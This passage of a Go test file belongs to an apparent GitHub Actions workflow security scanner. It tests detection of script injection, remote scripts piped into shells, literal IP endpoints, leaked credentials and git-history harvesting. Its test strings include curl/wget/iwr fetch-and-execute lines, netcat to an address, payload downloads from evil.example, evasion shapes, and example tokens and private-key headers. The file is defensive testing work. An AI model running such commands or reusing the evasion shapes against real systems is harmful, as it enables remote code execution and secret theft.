		{"github.repository", false, "repository is not a suffix"},
		{"github.sha", false, "a hash, not a suffix"},
		{"github.event.pull_request.head.ref.name", true, "the final segment is name, which is held at Warn"},
		{"github.event.issue.labels[0].name", true, "name is the final segment"},
	}

	for _, tt := range tests {
		t.Run(tt.expression, func(t *testing.T) {
			got := len(untrustedReferences("echo "+tt.expression+"\n")) > 0
			if got != tt.wantMatch {
				t.Errorf("matched = %v, want %v (%s)", got, tt.wantMatch, tt.reasoning)
			}
		})
	}
}

// The suffix set is GitHub's, verified verbatim. A missing suffix is a silent
// miss of a real attack surface, and an extra one is noise on every workflow
// that mentions it.
func TestUntrustedSuffixSet(t *testing.T) {
	want := []string{
		"body", "default_branch", "email", "head_ref", "label",
		"message", "name", "page_name", "ref", "title",
	}
	if len(untrustedSuffixes) != len(want) {
		t.Errorf("suffix set has %d entries, want %d (GitHub publishes exactly ten)", len(untrustedSuffixes), len(want))
	}
	for _, suffix := range want {
		if !untrustedSuffixes[suffix] {
			t.Errorf("suffix %q is missing from the set", suffix)
		}
	}
	for suffix := range untrustedSuffixes {
		if !contains(want, suffix) {
			t.Errorf("suffix %q is in the set but is not one of GitHub's ten", suffix)
		}
	}
}

func contains(list []string, s string) bool {
	for _, item := range list {
		if item == s {
			return true
		}
	}
	return false
}

// plan.md puts name in the Block tier. It ships as Warn because it is the widest
// of the ten and P2 has not measured it yet. This pins that decision so it
// cannot be forgotten, and so promoting it later is a one line change.
func TestNameSuffixIsHeldAtWarn(t *testing.T) {
	if blockTierSuffixes["name"] {
		t.Error("name is in the Block set: it is meant to be held at Warn until P2 measures it")
	}
	if got := rule2Severity("github.event.issue.title", "name"); got != findings.SeverityWarn {
		t.Errorf("name severity = %q, want Warn: it is the widest suffix and ships held", got)
	}
	// Everything else in the Block tier still blocks.
	for _, suffix := range []string{"title", "body", "message", "email"} {
		if got := rule2Severity("github.event.x."+suffix, suffix); got != findings.SeverityBlock {
			t.Errorf("%s severity = %q, want Block", suffix, got)
		}
	}
}

// A context that ends in a Block suffix but needs write access to create is not
// reachable by a fork pull request, so it cannot be Block.
func TestWriteGatedContextsAreDemoted(t *testing.T) {
	for expression := range writeGatedContexts {
		suffix := expression[strings.LastIndex(expression, ".")+1:]
		got := rule2Severity(expression, suffix)
		if got != findings.SeverityWarn {
			t.Errorf("%s severity = %q, want Warn: creating it already needs write access", expression, got)
		}
	}
	// The same suffix outside the write gated context still blocks, which is
	// what makes this a context demotion rather than a suffix demotion.
	if got := rule2Severity("github.event.pull_request.title", "title"); got != findings.SeverityBlock {
		t.Errorf("pull_request.title severity = %q, want Block", got)
	}
}

// Rule 2 is the only rule that blocks on a fork-reachable input, and it must
// not block on the ref tier. A ref needs push access.
func TestRule2WarnTierDoesNotBlock(t *testing.T) {
	refs, _ := parseFixture(t, "ppe-002/injected.yml")
	bySev := map[findings.Severity]int{}
	for _, f := range Rule2(refs) {
		bySev[f.Severity]++
	}
	if bySev[findings.SeverityBlock] != 4 {
		t.Errorf("Block count = %d, want 4", bySev[findings.SeverityBlock])
	}
	if bySev[findings.SeverityWarn] != 3 {
		t.Errorf("Warn count = %d, want 3", bySev[findings.SeverityWarn])
	}

	// A workflow whose only untrusted references are ref tier must not block.
	warnOnly, err := parse.Parse([]byte(`jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.head_ref }}"
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if got := Rule2(warnOnly); got.HasBlock() {
		t.Error("a ref tier reference blocks: it needs push access to exploit")
	}
}

// Rule 2 reads run: blocks only. A value in an env block or an action input is
// not script text, and env is GitHub's documented mitigation.
func TestRule2ReadsRunBlocksOnly(t *testing.T) {
	file, err := parse.Parse([]byte(`jobs:
  build:
    runs-on: ubuntu-latest
    env:
      TITLE: ${{ github.event.pull_request.title }}
    steps:
      - uses: fakeaction/checktitle@0123456789abcdef0123456789abcdef01234567
        with:
          title: ${{ github.event.pull_request.title }}
      - if: github.event.pull_request.title != ''
        run: echo hi
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if got := Rule2(file); len(got) != 0 {
		t.Errorf("got %d findings, want 0: env, with, and if are not script text", len(got))
	}
}

// A match partway through a block scalar has to point at its own line, not at
// the run: key, or every finding in a multi line script is unactionable.
func TestRule2PointsAtTheMatchedLine(t *testing.T) {
	file, data := parseFixture(t, "ppe-002/injected.yml")

	got := Rule2(file)
	if len(got) == 0 {
		t.Fatal("no findings")
	}

	// Each finding must point at the line its own match is on, not at the run:
	// key above the whole script. Every expression in the fixture is on a
	// distinct line inside one block scalar, so the lines must be distinct too.
	seen := map[int]bool{}
	for _, f := range got {
		if seen[f.Location.Line] {
			t.Errorf("two findings on line %d: the location is not tracking the match", f.Location.Line)
		}
		seen[f.Location.Line] = true
	}

	// The first match is the title, the last is milestone.title, several lines
	// further down in a different job.
	first, last := got[0], got[len(got)-1]
	if first.Location.Line >= last.Location.Line {
		t.Errorf("first finding line %d is not before the last %d", first.Location.Line, last.Location.Line)
	}
	if first.Location.JobID != "build" || first.Location.StepNumber != 1 {
		t.Errorf("first finding location = %+v, want job build step 1", first.Location)
	}
	if want := lineOf(t, data, `title="${{ github.event.pull_request.title }}"`); first.Location.Line != want {
		t.Errorf("first finding line = %d, want %d", first.Location.Line, want)
	}
}

// lineAt maps an offset in a script back to a file line. The guard for an
// offset outside the script matters because a finding must never be placed on a
// line that does not exist.
func TestRunSiteLineAt(t *testing.T) {
	site := runSite{script: "one\ntwo\nthree\n", runLine: 10}

	tests := []struct {
		name   string
		offset int
		want   int
	}{
		{"start of the script", 0, 10},
		{"after the first newline", 4, 11},
		{"after the second newline", 8, 12},
		{"end of the script", len(site.script), 13},
		{"past the end", len(site.script) + 10, 10},
		{"negative", -1, 10},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := site.lineAt(tt.offset); got != tt.want {
				t.Errorf("lineAt(%d) = %d, want %d", tt.offset, got, tt.want)
			}
		})
	}

	// A site with no known line stays at zero rather than inventing one.
	unknown := runSite{script: "one\ntwo\n"}
	if got := unknown.lineAt(4); got != 0 {
		t.Errorf("lineAt with no runLine = %d, want 0", got)
	}
}

// ---------------------------------------------------------------- rule 3

func TestRule3FlagsRemoteScriptExec(t *testing.T) {
	file, data := parseFixture(t, "ppe-003/malicious.yml")

	got := Rule3(file)

	assertFindings(t, got, []want{
		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "curl -sSL https://example.invalid/install.sh | bash")},
		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "wget -qO- https://example.invalid/setup.sh")},
		{Rule3ID, findings.SeverityBlock, lineOf(t, data, "iwr https://example.invalid/p.ps1 -useb")},
	})
}

// A shell line continuation splits the pipeline across lines. A matcher that
// stops at a newline sees no pipe at all, which is how the wget and iwr shapes
// were missed in the first run of this rule.
func TestRule3CrossesLineContinuations(t *testing.T) {
	tests := []struct {
		name   string
		script string
		want   int
	}{
		{"single line", "curl -sSL https://host/x.sh | bash\n", 1},
		{"continuation before the pipe", "wget -qO- https://host/x.sh \\\n  | sh\n", 1},
		{"continuation before the downloader", "curl \\\n  -sSL https://host/x.sh | bash\n", 1},
		{"sudo between pipe and shell", "curl https://host/x | sudo sh\n", 1},
		{"bash, zsh, ksh", "curl https://host/x | zsh\n", 1},
		{"powershell iex", "iwr https://host/x -useb | iex\n", 1},
		{"piped into a checksum", "curl -sSL https://host/x.tar.gz | sha256sum -c -\n", 0},
		{"piped into grep", "curl https://host/x | grep foo\n", 0},
		{"no pipe at all", "curl -sSL https://host/x.sh -o /tmp/x\n", 0},
		{"a shell in a path, not an interpreter", "echo /usr/local/bin/bash\n", 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := len(remoteScriptMatches(tt.script)); got != tt.want {
				t.Errorf("got %d matches, want %d for %q", got, tt.want, tt.script)
			}
		})
	}
}

// The interpreter needs a word boundary after it, or every pipeline into
// sha256sum is reported as remote code execution.
func TestRule3InterpreterWordBoundary(t *testing.T) {
	for _, script := range []string{
		"curl https://host/x | sha256sum -c -\n",
		"curl https://host/x | shasum\n",
		"curl https://host/x | shopt -s nullglob\n",
	} {
		if got := len(remoteScriptMatches(script)); got != 0 {
			t.Errorf("%q matched %d times, want 0: the interpreter needs a word boundary after it", script, got)
		}
	}
}

// ---------------------------------------------------------------- rule 4

// A four part version and an IPv4 address are the same token shape. What
// separates them is whether anything on the line is going to connect to it, so
// this is the case that decides whether rule 4 blocks a Gradle build.
func TestRule4RequiresNetworkContext(t *testing.T) {
	tests := []struct {
		script      string
		wantIPs     int
		wantPathIPs int
		wantURL     int
		reason      string
	}{
		{"curl http://203.0.113.7/x -o /tmp/x\n", 1, 0, 1, "a URL with an IP host is an endpoint"},
		{"nc 203.0.113.7 4444 < /dev/null\n", 1, 0, 0, "a network command with a bare IP"},
		{"ssh user@10.0.0.5\n", 1, 0, 0, "ssh with a bare IP"},
		{"rsync -a file 10.0.0.5:/tmp/\n", 1, 0, 0, "rsync with a bare IP"},
		{"./gradlew build -Dversion=1.2.3.4\n", 0, 0, 0, "a four part version is not an endpoint"},
		{"echo \"building 1.2.3.4\"\n", 0, 0, 0, "a version string in a message is not an endpoint"},
		{"echo 10.0.0.1\n", 0, 0, 0, "printing an address connects to nothing"},
		{"wget http://internal.example.invalid/report\n", 0, 0, 1, "a named host over http is the plaintext case"},
		{"curl https://example.invalid/1.2.3.4/tool\n", 0, 1, 0, "a version in an https path is Warn, not Block: usually a version, but worth a glance"},
		{"echo 999.999.999.999\n", 0, 0, 0, "octets out of range are not an address"},
	}

	for _, tt := range tests {
		t.Run(tt.reason, func(t *testing.T) {
			got := literalEndpointMatches(tt.script)
			// Count each kind separately: an IP in a URL path is neither a bare
			// endpoint nor a plaintext URL, so lumping it in with the URLs hid
			// the fact that it was being produced at all.
			var ips, pathIPs, urls int
			for _, m := range got {
				switch m.kind {
				case endpointIP:
					ips++
				case endpointIPInPath:
					pathIPs++
				case endpointHTTP:
					urls++
				}
			}
			if ips != tt.wantIPs || pathIPs != tt.wantPathIPs || urls != tt.wantURL {
				t.Errorf("got %d IPs, %d path IPs and %d URLs, want %d, %d and %d",
					ips, pathIPs, urls, tt.wantIPs, tt.wantPathIPs, tt.wantURL)
			}
		})
	}
}

// A URL whose host is a bare IP produces two findings at two tiers, and both
// are wanted: they are different problems with different fixes.
func TestRule4TiersForIPHostURL(t *testing.T) {
	file, _ := parseFixture(t, "ppe-003/malicious.yml")

	var severities []findings.Severity
	for _, f := range Rule4(file) {
		severities = append(severities, f.Severity)
	}

	blocks, warns := 0, 0
	for _, sev := range severities {
		if sev == findings.SeverityBlock {
			blocks++
		}
		if sev == findings.SeverityWarn {
			warns++
		}
	}
	if blocks != 3 {
		t.Errorf("Block findings = %d, want 3 (two IP hosts plus one bare IP with netcat)", blocks)
	}
	if warns != 4 {
		t.Errorf("Warn findings = %d, want 4 (three http:// URLs plus one address in a URL path)", warns)
	}

	// The path finding has to be Warn, not Block. It is usually a version, and
	// blocking on it would block the versioned download URLs that real
	// repositories are full of.
	for _, f := range Rule4(file) {
		if strings.Contains(f.Message, "in the path of a URL") && f.Severity != findings.SeverityWarn {
			t.Errorf("the path finding is %q, want Warn", f.Severity)
		}
	}
}

// ---------------------------------------------------------------- rule 5

func TestRule5FlagsCredentialPatterns(t *testing.T) {
	file, data := parseFixture(t, "ppe-003/malicious.yml")

	got := Rule5(file)

	assertFindings(t, got, []want{
		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE")},
		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "GH_TOKEN=ghp_EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE")},
		{Rule5ID, findings.SeverityBlock, lineOf(t, data, "-----BEGIN OPENSSH PRIVATE KEY-----")},
	})
}

// Each pattern has to match a real shaped value and not match the things that
// merely look like its prefix.
func TestCredentialPatternShapes(t *testing.T) {
	tests := []struct {
		pattern string
		script  string
		want    int
		reason  string
	}{
		{"AKIAIOSFODNN7EXAMPLE", "export A=AKIAIOSFODNN7EXAMPLE\n", 1, "the AWS documentation example value"},
		{"AKIA", "echo $AKIA_REGION\n", 0, "a variable named for a prefix is not a key"},
		{"AKIA", "AKIASHORT\n", 0, "the body is required, not just the prefix"},
		{"ghp_", "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8" + "\n", 1, "a 36 character body is a PAT"},
		{"ghp_", "ghp_tooshort\n", 0, "too short to be a PAT"},
		{"private key", "-----BEGIN RSA PRIVATE KEY-----\n", 1, "an RSA key block"},
		{"private key", "-----BEGIN OPENSSH PRIVATE KEY-----\n", 1, "an OpenSSH key block"},
		{"private key", "-----BEGIN CERTIFICATE-----\n", 0, "a certificate is not a private key"},
		{"sk-", "sk-abcdefghijklmnopqrstuvwxyz123456\n", 1, "a long enough body"},
		{"sk-", "echo sk-directory sk-prefix\n", 0, "hyphenated words are not keys"},
		{"xoxb", "xoxb-1234567890-abcdefghij\n", 1, "a Slack bot token"},
		{"xoxr", "xoxr-1234567890-abcdefghij\n", 1, "a Slack user token"},
		{"xox", "xoxz-1234567890-abcdefghij\n", 0, "not a Slack token type"},
	}

	for _, tt := range tests {
		t.Run(tt.reason, func(t *testing.T) {
			if got := len(credentialMatches(tt.script)); got != tt.want {
				t.Errorf("got %d matches, want %d for %q", got, tt.want, tt.script)
			}
		})
	}
}

// ---------------------------------------------------------------- rule 6

func TestRule6FlagsCorrelatedHarvest(t *testing.T) {
	file, data := parseFixture(t, "ppe-006/correlated.yml")

	got := Rule6(file)

	assertFindings(t, got, []want{
		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  harvest:")},
		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  forensics:")},
		{Rule6ID, findings.SeverityBlock, lineOf(t, data, "  blame:")},
	})
	for _, f := range got {
		if f.Location.JobID == "" {
			t.Error("a rule 6 finding does not name its job: the whole point is which job correlates")
		}
	}
}

// The correlation is per job. Two ordinary jobs in one workflow are not a
// finding, and this is the case that decides whether rule 6 survives contact
// with real repositories, since it blocks.
func TestRule6NeedsBothSignalsInOneJob(t *testing.T) {
	file, _ := parseFixture(t, "ppe-006/split_job.yml")

	if got := Rule6(file); len(got) != 0 {
		for _, f := range got {
			t.Errorf("unexpected finding: %s on job %q, want none: the signals are in different jobs", f.RuleID, f.Location.JobID)
		}
	}
}

// git log on its own is a changelog job. Only the patch output dumps diffs, and
// a diff is where a rotated secret still lives.
func TestRule6HistoryNeedsAPatchFlag(t *testing.T) {
	tests := []struct {
		script string
		want   bool
		reason string
	}{
		{"git log -p -n 500 > /tmp/h.txt\n", true, "a patch dump reads every diff"},
		{"git log --patch -1\n", true, "the long form of the same"},
		{"git log -up -1\n", true, "a grouped short flag containing p"},
		{"git rev-list --all\n", true, "walks every commit"},
		{"git show HEAD~5 --stat\n", true, "prints a commit"},
		{"git log --pretty=format:\"%s\" v1.0.0..HEAD\n", false, "one line per commit is a changelog"},
		{"git log --oneline -n 10\n", false, "subjects only is not a diff"},
		{"echo /usr/bin/gitlog\n", false, "a path, not a command"},
	}

	for _, tt := range tests {
		t.Run(tt.reason, func(t *testing.T) {
			if got := readsHistory(tt.script); got != tt.want {
				t.Errorf("readsHistory(%q) = %v, want %v", tt.script, got, tt.want)
			}
		})
	}
}

// fetch-depth is compared as text, because parse does not type convert, so the
// quoted "0" is the same signal as the bare 0.
func TestRule6FetchDepthIsComparedAsText(t *testing.T) {
	tests := []struct {
		name        string
		depth       string
		history     string
		wantFinding bool
	}{
		{"depth 0 and a patch dump", "0", "git log -p", true},
		{"quoted depth 0 and a patch dump", `"0"`, "git log -p", true},
		{"depth 1 and a patch dump", "1", "git log -p", false},
		{"depth 0 and a changelog", "0", "git log --oneline", false},
		{"depth 0 and no history", "0", "npm ci", false},
		{"no depth and a patch dump", "", "git log -p", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// The with: block is only written when there is a depth, because a
			// with: key with nothing under it is a parse error.
			with := ""
			if tt.depth != "" {
				with = "        with:\n          fetch-depth: " + tt.depth + "\n"
			}
			src := "jobs:\n  harvest:\n    runs-on: ubuntu-latest\n    steps:\n" +
				"      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n" +
				with +
				"      - run: " + tt.history + "\n"
			file, err := parse.Parse([]byte(src))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if got := len(Rule6(file)) > 0; got != tt.wantFinding {
				t.Errorf("fired = %v, want %v", got, tt.wantFinding)
			}
		})
	}
}

// All four of these block. They are the rules that fire on attacker-controlled
// content, which is the only thing allowed to fail a merge.
func TestRules3To6Block(t *testing.T) {
	malicious, _ := parseFixture(t, "ppe-003/malicious.yml")
	for name, got := range map[string]findings.Findings{
		"rule 3": Rule3(malicious),
		"rule 4": Rule4(malicious),
		"rule 5": Rule5(malicious),
	} {
		if len(got) == 0 {
			t.Errorf("%s produced no findings on the malicious fixture", name)
			continue
		}
		if !got.HasBlock() {
			t.Errorf("%s does not block: rules 3 to 6 are the blocking set", name)
		}
	}

	correlated, _ := parseFixture(t, "ppe-006/correlated.yml")
	if !Rule6(correlated).HasBlock() {
		t.Error("rule 6 does not block")
	}
}

// placeIP has to survive a URL with credentials in it, where the host is the
// bare IP and the credentials sit between the scheme and the address.
func TestPlaceIPWithCredentials(t *testing.T) {
	line := "curl http://user:pass@10.0.0.1/x"
	if got := placeIP(urlSpans(line), strings.Index(line, "10.0.0.1")); got != ipURLHost {
		t.Errorf("IP after credentials = %v, want a URL host", got)
	}

	pathLine := "curl http://user:pass@host.example/1.2.3.4/x"
	if got := placeIP(urlSpans(pathLine), strings.Index(pathLine, "1.2.3.4")); got != ipURLPath {
		t.Errorf("IP in the path = %v, want a URL path", got)
	}
}

// The evasion this rule 4 change exists to close. An attacker who knows a
// scanner reads URL hosts has exactly one move available, which is to put the
// address in the path instead, so every shape of that has to be reported rather
// than skipped.
func TestRule4ReportsAnAddressInAURLPath(t *testing.T) {
	cases := []struct {
		script string
		reason string
	}{
		{"curl -sS https://evil.example/1.2.3.4/payload -o /tmp/p\n", "IP in the path"},
		{"curl -sS https://evil.example/x/203.0.113.7/y -o /tmp/p\n", "IP in a later path segment"},
		{"curl -sS https://evil.example/a?host=1.2.3.4 -o /tmp/p\n", "IP in the query"},
		{"curl -sS https://evil.example/a#1.2.3.4 -o /tmp/p\n", "IP in the fragment"},
		{"curl -sS 'https://evil.example?host=1.2.3.4' -o /tmp/p\n", "IP in a query on a URL with no path"},
		{"curl -sS 'https://evil.example#1.2.3.4' -o /tmp/p\n", "IP in a fragment on a URL with no path"},
		{"wget -q http://evil.example/1.2.3.4/x -O /tmp/x\n", "IP in the path over plain http"},
		{"curl -sS https://evil.example/1.2.3.4\n", "IP at the end of the path"},
		{"curl -sS https://evil.example/1.2.3.4/x -o /tmp/p && sleep 1\n", "IP in the path with a trailing chain"},
		{"curl -sS 'https://evil.example/1.2.3.4/p' -o /tmp/p\n", "IP in the path inside quotes"},
	}
	for _, c := range cases {
		// Count the path finding rather than the total, because a plain http
		// URL produces two: the plaintext Warn and the path Warn. Both are
		// correct and they are separate problems.
		var pathIPs int
		for _, m := range literalEndpointMatches(c.script) {
			if m.kind == endpointIPInPath {
				pathIPs++
			}
		}
		if pathIPs != 1 {
			t.Errorf("%s: got %d path IPs, want 1", c.reason, pathIPs)
		}
	}

	// And the shapes that must stay silent, which is the other half of the
	// change: this is a Warn tier finding, not a reason to flag version numbers.
	silent := []struct {
		script string
		reason string
	}{
		{"echo 1.2.3.4\n", "no network context"},
		{"echo https://evil.example/1.2.3.4\n", "no network command on the line"},
		{"./gradlew build -Dversion=1.2.3.4\n", "a version flag"},
		{"./gradlew build\n", "nothing at all"},
	}
	for _, c := range silent {
		if got := literalEndpointMatches(c.script); len(got) != 0 {
			t.Errorf("%s: got %+v, want nothing", c.reason, got)
		}
	}
}

// An address that merely follows a URL is not in that URL's path. The backwards
// search this replaced read it as a path, so `curl http://host/x 1.2.3.4` was
// classified as a version rather than as an address beside a network command.
func TestPlaceIPAfterAURLIsNotInItsPath(t *testing.T) {
	line := "curl http://host.example/x 1.2.3.4"
	if got := placeIP(urlSpans(line), strings.Index(line, "1.2.3.4")); got != ipStandalone {
		t.Errorf("IP after a URL = %v, want standalone: it is a second argument to curl", got)
	}

	// And the end of that behaviour: it is a bare address next to a network
	// command, so it blocks.
	// Two matches, both correct: the http:// URL is the plaintext case, and the
	// bare address is a second argument to curl.
	got := literalEndpointMatches(line)
	if len(got) != 2 {
		t.Errorf("matches = %+v, want 2 (the URL and the bare IP)", got)
		return
	}
	if got[1].kind != endpointIP {
		t.Errorf("second match kind = %v, want endpointIP", got[1].kind)
	}
	if got[0].kind != endpointHTTP {
		t.Errorf("first match kind = %v, want endpointHTTP", got[0].kind)
	}
}

// Several credential patterns in one script, each reported once and in script
// order, so a script with two of them does not report the second one first.
func TestCredentialMatchesAreInScriptOrder(t *testing.T) {
	script := "first AKIAIOSFODNN7EXAMPLE\nthen xoxb-1234567890-abcdefghij\nlast sk-abcdefghijklmnopqrstuvwxyz\n"
	got := credentialMatches(script)

	if len(got) != 3 {
		t.Fatalf("got %d matches, want 3", len(got))
	}
	for i := 1; i < len(got); i++ {
		if got[i].offset <= got[i-1].offset {
			t.Errorf("match %d at offset %d is not after match %d at offset %d",
				i, got[i].offset, i-1, got[i-1].offset)
		}
	}
	if got[0].patternName != "AWS access key id" {
		t.Errorf("first match pattern = %q, want AWS access key id", got[0].patternName)
	}
}

// Endpoints are reported in script order too, so a line with both an IP and a
// URL comes out the way it is written rather than all IPs then all URLs.
func TestEndpointMatchesAreInScriptOrder(t *testing.T) {
	script := "nc 10.0.0.1 4444\nwget http://host.example/x\ncurl 10.0.0.2:80/y\n"
	got := literalEndpointMatches(script)

	if len(got) != 3 {
		t.Fatalf("got %d matches, want 3", len(got))
	}
	for i := 1; i < len(got); i++ {
		if got[i].offset <= got[i-1].offset {
			t.Errorf("match %d at offset %d is not after match %d at offset %d",
				i, got[i].offset, i-1, got[i-1].offset)
		}
	}
}

// A script with no trailing newline still has its lines counted, so an offset
// at the very end maps to a real line rather than past the end of the file.
func TestScriptLinesWithoutTrailingNewline(t *testing.T) {
	lines := scriptLines("one\ntwo")
	if len(lines) != 2 {
		t.Fatalf("got %d lines, want 2", len(lines))
	}
	if lines[1].text != "two" {
		t.Errorf("second line = %q, want two", lines[1].text)
	}
	if lines[1].offset != 4 {
		t.Errorf("second line offset = %d, want 4", lines[1].offset)
	}
}
